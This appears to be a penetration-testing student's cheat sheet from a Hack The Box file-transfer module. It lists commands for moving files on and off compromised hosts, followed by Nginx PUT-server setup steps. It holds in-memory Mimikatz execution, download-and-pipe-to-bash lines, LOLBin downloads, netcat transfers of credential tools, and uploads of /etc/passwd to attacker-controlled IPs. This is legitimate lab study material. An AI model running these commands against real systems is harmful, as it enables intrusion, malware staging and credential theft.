
#### Links
https://lolbas-project.github.io/
https://gtfobins.github.io/
https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe


| **Command**                                                                                                                                                                                                                                                                            | **Description**                                  |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
|  `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                                                                                                                                                                                               | Download a file with PowerShell                  |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                                                                                                                                                                                                  | Execute a file in memory using PowerShell        |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                                                                                                                                                                                                | Upload a file with PowerShell                    |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                                                                                                                                                                                       | Download a file using Bitsadmin                  |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                                                                                                                                                                                          | Download a file using Certutil                   |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                                                                                                                                                                                       | Download a file using Wget                       |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                                                                                                                                                                                       | Download a file using cURL                       |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`                                                                                                                                                                              | PHP Download with File_get_contents()            |
| `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' \| bash`                                                                                                                    | Download a file using PHP and pipe to bash       |
| `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`<br>` | PHP Download with Fopen()                        |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                                                                                                                                                                                     | Upload a file using SCP                          |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                                                                                                                                                                                               | Download a file using SCP                        |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`                                                                                                                                                                     | Invoke-WebRequest using a Chrome User Agent      |
| `python3 -m uploadserver <br>`                                                                                                                                                                                                                                                         | Starting the Python uploadserver Module          |
| `shell-session<br>python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'<br>`                                                                                                                                        | Uploading a File Using a Python One-liner        |
| `cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`                                                                                                                                                    | Download a File Using VBScript and cscript.exe   |
| `cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1<br>`                                                                                                                                                  | Download a File Using JavaScript and cscript.exe |
| `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`                                                                                                                                                         | Perl - Download a File                           |
| `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`                                                                                                                           | Ruby - Download a File                           |
| `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`                                                                                                                                | Python 3 - Download                              |
| `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`                                                                                                                                             | Python 2 - Download                              |
| `nc -l -p 8000 > SharpKatz.exe`                                                                                                                                                                                                                                                        | NetCat - set to listen  and receive file         |
| `ncat -l -p 8000 --recv-only > SharpKatz.exe`                                                                                                                                                                                                                                          | Ncat - Close on completion                       |
| `nc -q 0 192.168.49.128 8000 < SharpKatz.exe`                                                                                                                                                                                                                                          | nc - close on completion                         |
| ncat --send-only 192.168.49.128 8000 < SharpKatz.exe                                                                                                                                                                                                                                   | ncat - listening and send file on connect        |
| `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`                                                                                                                                                                              | Mounting a Linux Folder Using rdesktop           |
| `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`                                                                                                                                                               | Mounting a Linux Folder Using xfreerdp           |
| `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`                                                                                                                                                                                                             | Encrypting /etc/passwd with openssl              |
| `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`                                                                                                                                                                                                               | Decrypt passwd.enc with openssl<br>              |
| `[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() \| Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} \| fl`                                                                                                   | Listing out User Agents                          |
| `PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`<br>`PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`                                                                                      | Request with Chrome User Agent<br>               |
## Nginx - Enabling PUT
#### Create a Directory to Handle Uploaded Files
crimsonguard@htb[/htb]`$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory`

#### Change the Owner to www-data
crimsonguard@htb[/htb]`$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`

#### Create Nginx Configuration File
Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:
```
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
#### Symlink our Site to the sites-enabled Directory
```shell-session
$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

#### Start Nginx
crimsonguard@htb[/htb]`$ sudo systemctl restart nginx.service`

#### Verifying Errors
crimsonguard@htb[/htb]`$ tail -2 /var/log/nginx/error.log`
crimsonguard@htb[/htb]`$ ss -lnpt | grep 80`
crimsonguard@htb[/htb]`$ ps -ef | grep 2811`

#### Remove NginxDefault Configuration
crimsonguard@htb[/htb]`$ sudo rm /etc/nginx/sites-enabled/default`

#### Upload File Using cURL
crimsonguard@htb[/htb]`$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`

crimsonguard@htb[/htb]`$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt`
```shell-session
user65:x:1000:1000:,,,:/home/user65:/bin/bash
```
